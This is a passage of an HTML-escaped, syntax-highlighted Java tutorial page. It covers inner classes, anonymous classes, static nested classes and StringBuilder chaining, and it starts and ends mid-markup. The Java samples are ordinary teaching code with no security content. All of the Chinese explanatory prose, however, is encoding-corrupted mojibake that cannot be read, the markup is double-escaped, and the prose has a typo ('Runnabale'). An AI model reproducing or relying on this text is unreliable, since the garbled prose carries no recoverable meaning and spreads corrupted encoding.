&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŽŸå› æ˜¯Inner Classé™¤äº†&lt;code>this&lt;/code>æŒ‡å‘è‡ªå·±ä»¥å¤–è¿˜éšå«åœ°æŒæœ‰ä¸€ä¸ªOuter Classå®žä¾‹ï¼Œå¯ä»¥ç”¨&lt;code>Outer.this&lt;/code>è®¿é—®è¿™ä¸ªå®žä¾‹ï¼›æ‰€ä»¥ï¼Œå®žä¾‹åŒ–ä¸€ä¸ªInner Classä¸èƒ½è„±ç¦»Outerå®žä¾‹&lt;/p>
&lt;p>Inner Classå’Œæ™®é€šClassç›¸æ¯”ï¼Œé™¤äº†èƒ½å¼•ç”¨Outerå®žä¾‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„ç‰¹æƒï¼šå¯ä»¥ä¿®æ”¹Outer Classçš„&lt;code>private&lt;/code>å­—æ®µï¼›å› ä¸ºInner Classçš„ä½œç”¨åŸŸåœ¨Outer Classå†…éƒ¨ï¼Œæ‰€ä»¥èƒ½è®¿é—®Outer Classçš„&lt;code>private&lt;/code>å­—æ®µå’Œæ–¹æ³•&lt;/p>
&lt;p>è§‚å¯ŸJavaç¼–è¯‘å™¨ç¼–è¯‘åŽçš„&lt;code>.class&lt;/code>æ–‡ä»¶å¯ä»¥å‘çŽ°ï¼Œ&lt;code>Outer&lt;/code>ç±»è¢«ç¼–è¯‘ä¸º&lt;code>Outer.class&lt;/code>ï¼Œè€Œ&lt;code>Inner&lt;/code>ç±»è¢«ç¼–è¯‘ä¸º&lt;code>Outer$Inner.class&lt;/code>&lt;/p>
&lt;ul>
&lt;li>è¿˜å¯ä»¥é€šè¿‡åŒ¿åç±»Anonymous Classæ¥å®šä¹‰Inner Classï¼Œä¸¤è€…æœ¬è´¨ä¸Šç›¸åŒ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">asyncHello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">//
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Runnabale&lt;/code>æœ¬èº«æ˜¯ä¸èƒ½å®žä¾‹åŒ–çš„æŽ¥å£ï¼Œè¿™é‡Œå®žé™…å®šä¹‰äº†ä¸€ä¸ªå®žçŽ°äº†&lt;code>Runnable&lt;/code>æŽ¥å£çš„åŒ¿åç±»ï¼Œå¹¶é€šè¿‡newå®žä¾‹åŒ– ä¹‹åŽè½¬åž‹ä¸ºRunnableï¼Œè¿‡ç¨‹å¾ˆå¤šä½†æ˜¯å®žçŽ°èµ·æ¥ä»£ç å¾ˆç®€æ´ï¼›å’ŒInner Classä¸€æ ·ä¹Ÿå¯ä»¥è®¿é—®Outer Classçš„&lt;code>private&lt;/code>&lt;/p>
&lt;ul>
&lt;li>åŒ¿åç±»åœ¨å®šä¹‰æ—¶å¿…é¡»å®žä¾‹åŒ–ï¼Œæœ€ç»ˆä¼šç¼–è¯‘ä¸º&lt;code>Outer$1.class&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Runnable&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å®žçŽ°å¿…è¦çš„æŠ½è±¡æ–¹æ³•...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ç»§æ‰¿è‡ªæ™®é€šç±»çš„åŒ¿åç±»ï¼Œç¼–è¯‘ä¸º&lt;code>Main$1.class&lt;/code>å’Œ&lt;code>Main$2.class&lt;/code>ä¸¤ä¸ªåŒ¿åç±»æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{};&lt;/span> &lt;span style="color:#75715e">// åŒ¿åç±»!
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;B&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>é™æ€å†…éƒ¨ç±»ç¤ºä¾‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#111">sn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">StaticNested&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Outer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">NAME&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;OUTER&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">StaticNested&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">NAME&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨&lt;code>static&lt;/code>ä¿®é¥°çš„å†…éƒ¨ç±»å’ŒInner Classæœ‰å¾ˆå¤§çš„ä¸åŒï¼Œå®ƒä¸å†ä¾é™„äºŽ&lt;code>Outer&lt;/code>çš„å®žä¾‹ï¼Œè€Œæ˜¯ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ç±»ï¼Œå› æ­¤æ— æ³•å¼•ç”¨&lt;code>Outer.this&lt;/code>ï¼Œä½†å®ƒä»ç„¶å¯ä»¥è®¿é—®&lt;code>Outer&lt;/code>çš„&lt;code>private&lt;/code>é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•ï¼›å¦‚æžœæŠŠ&lt;code>StaticNested&lt;/code>ç§»åˆ°&lt;code>Outer&lt;/code>ä¹‹å¤–ï¼Œå°±å¤±åŽ»äº†è®¿é—®&lt;code>private&lt;/code>çš„æƒé™&lt;/p>
&lt;h2 id="javaæ ¸å¿ƒç±»éƒ¨åˆ†">Javaæ ¸å¿ƒç±»(éƒ¨åˆ†)&lt;/h2>
&lt;h3 id="stringbuilder">StringBuilder&lt;/h3>
&lt;ul>
&lt;li>æ˜¯ä¸€ä¸ªå¯å˜å¯¹è±¡ï¼Œå¯ä»¥é¢„åˆ†é…ç¼“å†²åŒºï¼Œå‘å…¶ä¸­æ–°å¢žå­—ç¬¦æ—¶ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„ä¸´æ—¶å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¯é“¾å¼æ“ä½œ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">sb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Mr &amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insert&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello, &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å®žçŽ°çš„å…³é”®æ˜¯å®šä¹‰çš„&lt;code>append()&lt;/code>æ–¹æ³•ä¼šè¿”å›ž&lt;code>this&lt;/code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¸æ–­è°ƒç”¨è‡ªèº«çš„å…¶ä»–æ–¹æ³•ï¼›ä»¿å†™é“¾å¼è°ƒç”¨å‡½æ•°&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
